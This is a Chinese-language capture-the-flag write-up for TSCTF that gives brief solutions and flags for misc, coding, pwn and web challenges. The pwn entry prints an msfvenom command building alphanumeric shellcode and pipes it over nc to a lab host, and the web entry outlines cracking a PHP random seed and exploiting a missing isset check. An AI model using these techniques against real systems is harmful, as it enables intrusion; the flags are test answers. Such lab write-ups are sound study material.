misc - logo

hexdump -C logo.png | tail -n 4

可以看到文件最后是 base64，解之

TSCTF{Base64_decoding!!!}

===============================================================================

coding - 小明二进制

数 1 的个数，然后使用尽量少的数字达成目标

详见 code_1_xmbin.py

Congratulation! You complete! The flag is TSCTF{this_is_coding}

===============================================================================

coding - 泽哥的算术

使用 python 内置的快速幂即可

详见 code_2_zgcalc.py

flag is TSCTF{Y0uR_m4th_1s_Vry_G0od}

===============================================================================

coding - Las Vegas

取石子游戏

详见 code_3_las_vegas.py

flag is TSCTF{u_R_K!ng_0f_L4s_Vegas}

===============================================================================

pwn - ascii

题目要求纯 ASCII shellcode

使用 msf 工具辅助生成 shellcode，直接从管道灌进去

看汇编，shellcode 被存在了 EAX 寄存器所指的位置，于是可以生成纯 ASCII 的 shellcode

msfvenom -p linux/x86/exec CMD='/bin/cat flag' -e x86/alpha_mixed BufferRegister=EAX -f raw > payload.bin
cat payload.bin - | nc 10.105.42.5 4446

TSCTF{cfca22848bf98a32c13576d2f7d3c9a8}

===============================================================================

misc - 神秘的文件

文件是 wireshark 网络抓包的文件

里面有两个 FTP STOR 请求

导出其数据

tsctf.txt 内有一 hash 和字典，爆破得其密码

用此密码解压 flag.zip，得 FLAG.txt，内容为

TSCTF{dHNjdGZfcmV2b2x1dGlvbl8yMDE3X01heQ==}

解 base64 得最终 flag

TSCTF{tsctf_revolution_2017_May}

===============================================================================

coding - 修路

并查集问题

详见 code4.py

flag is TSCTF{R04ds_BeIOng_2_yoU!1!}

===============================================================================

misc - zipcrc

文件内有三个 4 字节的文件，但是通过 unzip -lv 可以看到文件们的 crc32 哈希

通过爆破可得密码 Ea4YC3CdEcRy

解压 zip 可得一 base64 编码后的 python 脚本

可以写出其算法的反向版本，解其 ctMessage 可得 flag

TSCTF{rc4_1s_n0t_D1f5ic4lt__!!}

===============================================================================

web - 随机数

打开网页，注释内提示有 index.bak 文件

下载得一 php 文件

可以看到 session id 和 session user_key 皆由一个种子依次生成

而可查看的 session id 是直接讲数字进行 md5 哈希，可用 hashcat 爆破得解

因为 srand 生成的随机数有规律可查，通过 php_mt_seed 工具可以通过生成的随机数爆破得到随机数的种子

虽然一个随机数有多个可能的生成种子

但是对其多次尝试生成对应的 user_key 是可以做到的

拿到了 user_key 后我们就可以请求 flag

而拿 flag 的函数未对 secret_key 做 isset 检查，因此可以不使用 getKey 请求，直接传空的 secret_key 即可

其实请求 getKey 的话反而作茧自缚哦 :(

<b>Notice</b>:  Undefined index: secret_key in <b>/var/www/html/index.php</b> on line <b>38</b><br />
TSCTF{random_or_not_random}